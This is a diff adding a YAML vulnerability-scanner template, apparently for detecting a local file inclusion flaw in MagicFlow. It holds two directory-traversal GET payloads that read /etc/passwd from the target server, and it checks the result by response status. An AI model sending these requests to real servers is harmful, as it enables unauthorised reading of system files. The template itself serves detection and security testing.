@@ -1,0 +1,20 @@
+id: magicflow-lfi
+brief:
+    title: MagicFlow - Local File Inclusion
+    by: gy741
+    level: high
+    about: MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/m...
+    label:
+        - magicflow
+        - lfi
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd'
+        - '{{BaseURL}}/msa/../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
